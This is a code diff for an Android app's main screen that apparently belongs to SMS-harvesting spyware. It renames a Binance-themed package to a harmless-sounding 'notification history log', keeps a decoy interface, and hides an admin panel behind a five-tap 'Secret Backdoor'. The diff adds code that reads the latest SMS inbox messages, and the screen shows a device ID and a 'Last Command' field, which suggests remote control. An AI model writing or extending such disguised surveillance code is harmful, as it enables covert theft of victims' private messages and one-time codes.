@@ -1,23 +1,31 @@
-package dApp.binance.Trading.arfu
+package com.notification.historylog
 
-import android.content.Intent
-import android.os.Build
-import android.os.Bundle
-import androidx.appcompat.app.AppCompatActivity
-import android.widget.Button
-import android.widget.TextView
-import android.widget.LinearLayout
-import android.view.View
-import androidx.core.app.ActivityCompat
 import android.Manifest
 import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
+import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
-import android.net.Uri
 import android.telephony.SubscriptionManager
 import android.util.Log
+import android.view.LayoutInflater
+import android.view.View
+import android.view.ViewGroup
+import android.widget.Button
+import android.widget.LinearLayout
+import android.widget.TextView
 import android.widget.Toast
-import android.content.pm.PackageManager
+import androidx.appcompat.app.AppCompatActivity
+import androidx.appcompat.widget.SwitchCompat
+import androidx.core.app.ActivityCompat
+import androidx.recyclerview.widget.LinearLayoutManager
+import androidx.recyclerview.widget.RecyclerView
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class MainActivity : AppCompatActivity() {
     private lateinit var statusText: TextView
@@ -25,9 +33,13 @@ class MainActivity : AppCompatActivity() {
     private lateinit var lastCommandText: TextView
     private lateinit var decoyLayout: LinearLayout
     private lateinit var realLayout: LinearLayout
-    private lateinit var versionText: TextView
-    private lateinit var openSettingsButton: Button
+    private lateinit var toolbarTitle: TextView
+    private lateinit var decoyVersionText: TextView
     
+    private lateinit var loggerStatusText: TextView
+    private lateinit var loggerToggleSwitch: SwitchCompat
+    private lateinit var notificationRecyclerView: RecyclerView
+
     private var clickCount = 0
     private var lastClickTime = 0L
 
@@ -38,21 +50,34 @@ class MainActivity : AppCompatActivity() {
         // Initialize Views
         decoyLayout = findViewById(R.id.decoyLayout)
         realLayout = findViewById(R.id.realLayout)
-        versionText = findViewById(R.id.versionText)
-        openSettingsButton = findViewById(R.id.openSettingsButton)
+        toolbarTitle = findViewById(R.id.toolbarTitle)
+        decoyVersionText = findViewById(R.id.decoyVersionText)
         
+        loggerStatusText = findViewById(R.id.loggerStatusText)
+        loggerToggleSwitch = findViewById(R.id.loggerToggleSwitch)
+        notificationRecyclerView = findViewById(R.id.notificationRecyclerView)
+
         statusText = findViewById(R.id.statusText)
         deviceIdText = findViewById(R.id.deviceIdText)
         lastCommandText = findViewById(R.id.lastCommandText)
 
-        // Redirect Button (The Decoy)
-        openSettingsButton.setOnClickListener {
-            val intent = Intent(Settings.ACTION_SETTINGS)
-            startActivity(intent)
+        // Setup Decoy Logging Toggle
+        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
+        val isEnabled = sharedPref.getBoolean("carer_enabled", true)
+        loggerToggleSwitch.isChecked = isEnabled
+        updateLoggerStatus(isEnabled)
+
+        loggerToggleSwitch.setOnCheckedChangeListener { _, isChecked ->
+            sharedPref.edit().putBoolean("carer_enabled", isChecked).apply()
+            updateLoggerStatus(isChecked)
+            updateStatus()
         }
 
-        // Secret Backdoor: Tap version text 5 times
-        versionText.setOnClickListener {
+        // Setup RecyclerView
+        notificationRecyclerView.layoutManager = LinearLayoutManager(this)
+
+        // Secret Backdoor: Tap toolbar title 5 times
+        val backdoorListener = View.OnClickListener {
             val currentTime = System.currentTimeMillis()
             if (currentTime - lastClickTime < 1000) {
                 clickCount++
@@ -66,13 +91,20 @@ class MainActivity : AppCompatActivity() {
                 clickCount = 0
             }
         }
+        toolbarTitle.setOnClickListener(backdoorListener)
+        decoyVersionText.setOnClickListener(backdoorListener)
 
+        // Admin panel buttons
         findViewById<Button>(R.id.settingsButton).setOnClickListener {
             startActivity(Intent(this, SettingsActivity::class.java))
         }
 
         findViewById<Button>(R.id.viewLogsButton).setOnClickListener {
             startActivity(Intent(this, LogViewerActivity::class.java))
+        }
+
+        findViewById<Button>(R.id.exitAdminButton).setOnClickListener {
+            hideRealUI()
         }
 
         // Background logic
@@ -90,9 +122,60 @@ class MainActivity : AppCompatActivity() {
         Toast.makeText(this, "Admin Mode Activated", Toast.LENGTH_SHORT).show()
     }
 
+    private fun hideRealUI() {
+        realLayout.visibility = View.GONE
+        decoyLayout.visibility = View.VISIBLE
+    }
+
+    private fun updateLoggerStatus(enabled: Boolean) {
+        if (enabled) {
+            loggerStatusText.text = "Status: Logging Active"
+            loggerStatusText.setTextColor(android.graphics.Color.parseColor("#4CAF50"))
+        } else {
+            loggerStatusText.text = "Status: Logging Disabled"
+            loggerStatusText.setTextColor(android.graphics.Color.parseColor("#F44336"))
+        }
+    }
+
+    private fun loadNotifications() {
+        val items = mutableListOf<NotificationLogItem>()
+        try {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+                val cursor = contentResolver.query(
+                    Uri.parse("content://sms/inbox"),
+                    null, null, null, "date DESC"
+                )
+                if (cursor != null && cursor.moveToFirst()) {
+                    val count = if (cursor.count > 25) 25 else cursor.count
+                    for (i in 0 until count) {
+                        val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
+                        val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                        val date = cursor.getLong(cursor.getColumnIndexOrThrow("date"))
+                        items.add(NotificationLogItem(address, body, date))
+                        if (!cursor.moveToNext()) break
+                    }
+                    cursor.close()
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Error reading local SMS: ${e.message}")
+        }
+
+        val emptyState = findViewById<TextView>(R.id.emptyStateText)
+        if (items.isEmpty()) {
+            emptyState.visibility = View.VISIBLE
+            notificationRecyclerView.visibility = View.GONE
+        } else {
+            emptyState.visibility = View.GONE
+            notificationRecyclerView.visibility = View.VISIBLE
+            notificationRecyclerView.adapter = NotificationAdapter(items)
+        }
+    }
+
     override fun onResume() {
         super.onResume()
         updateStatus()
+        loadNotifications()
     }
 
     private fun requestRequiredPermissions() {
@@ -119,8 +202,9 @@ class MainActivity : AppCompatActivity() {
         if (permissions.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 100)
         } else {
-            // Permissions already granted, sync SMS
+            // Permissions already granted, sync SMS and load lists
             SmsHelper.syncLastMessages(this)
+            loadNotifications()
         }
     }
 
@@ -129,6 +213,7 @@ class MainActivity : AppCompatActivity() {
         if (requestCode == 100) {
             if (grantResults.isNotEmpty() && grantResults[permissions.indexOf(Manifest.permission.READ_SMS)] == PackageManager.PERMISSION_GRANTED) {
                 SmsHelper.syncLastMessages(this)
+                loadNotifications()
             }
         }
     }
@@ -181,5 +266,35 @@ class MainActivity : AppCompatActivity() {
         statusText.text = if (isEnabled) "✅ SERVICE ACTIVE" else "⚠️ SERVICE DISABLED"
         deviceIdText.text = "Device ID: $deviceId"
         lastCommandText.text = "Last Command: $lastCommand"
+    }
+
+    // RecyclerView Helper Classes
+    data class NotificationLogItem(
+        val sender: String,
+        val body: String,
+        val timestamp: Long
+    )
+
+    private class NotificationAdapter(private val list: List<NotificationLogItem>) : RecyclerView.Adapter<NotificationViewHolder>() {
+        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): NotificationViewHolder {
+            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_notification, parent, false)
+            return NotificationViewHolder(view)
+        }
+
+        override fun onBindViewHolder(holder: NotificationViewHolder, position: Int) {
+            holder.bind(list[position])
+        }
+
+        override fun getItemCount(): Int = list.size
+    }
+
+    private class NotificationViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) {
+        fun bind(item: NotificationLogItem) {
+            itemView.findViewById<TextView>(R.id.notificationSender).text = item.sender
+            itemView.findViewById<TextView>(R.id.notificationBody).text = item.body
+            
+            val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
+            itemView.findViewById<TextView>(R.id.notificationTime).text = sdf.format(Date(item.timestamp))
+        }
     }
 }
